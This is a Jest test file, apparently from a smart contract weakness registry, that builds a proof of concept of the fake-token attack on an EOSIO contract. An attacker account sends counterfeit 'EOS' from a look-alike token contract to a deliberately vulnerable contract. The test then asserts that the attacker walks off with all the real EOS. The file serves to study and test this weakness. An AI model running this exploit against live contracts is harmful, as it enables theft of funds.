const { loadConfig, Blockchain } = require("@klevoya/hydra");

const config = loadConfig("hydra.yml");

const eosStatsFixture = {
  EOS: [
    {
      supply: "100.0000 EOS",
      max_supply: "10000000000.0000 EOS",
      issuer: "eosio.token",
    },
  ],
};
describe("wcr-106", () => {
  let blockchain = new Blockchain(config);
  let eosioToken = blockchain.createAccount(`eosio.token`);
  let fakeToken = blockchain.createAccount(`fake.token`);
  let vuln = blockchain.createAccount(`vulnerable`);
  let attacker = blockchain.createAccount(`attacker`);

  beforeAll(async () => {
    vuln.setContract(blockchain.contractTemplates[`wcr-106`]);
    eosioToken.setContract(blockchain.contractTemplates[`eosio.token`]);
    fakeToken.setContract(blockchain.contractTemplates[`eosio.token`]);
    [vuln, eosioToken, fakeToken].forEach((acc) =>
      acc.updateAuth(`active`, `owner`, {
        accounts: [
          {
            permission: {
              actor: acc.accountName,
              permission: `eosio.code`,
            },
            weight: 1,
          },
        ],
      })
    );

    await eosioToken.loadFixtures(`stat`, eosStatsFixture);
    await fakeToken.loadFixtures(`stat`, eosStatsFixture);
    // give real EOS tokens to vulnerable contract
    await eosioToken.loadFixtures(`accounts`, {
      [vuln.accountName]: [
        {
          balance: "100.0000 EOS",
        },
      ],
    });
    // give fake EOS tokens to attacker
    await fakeToken.loadFixtures(`accounts`, {
      [attacker.accountName]: [
        {
          balance: "10000.0000 EOS",
        },
      ],
    });
  });

  it("can perform the attack", async () => {
    expect.assertions(2);

    await fakeToken.contract.transfer(
      {
        from: attacker.accountName,
        to: vuln.accountName,
        quantity: "10000.0000 EOS",
        memo: "sending fake EOS tokens",
      },
      [{ actor: attacker.accountName, permission: `active` }]
    );

    // attacker steals all real EOS tokens
    expect(eosioToken.getTableRowsScoped(`accounts`)[vuln.accountName]).toEqual(
      [
        {
          balance: `0.0000 EOS`,
        },
      ]
    );
    expect(
      eosioToken.getTableRowsScoped(`accounts`)[attacker.accountName]
    ).toEqual([
      {
        balance: `100.0000 EOS`,
      },
    ]);
  });
});
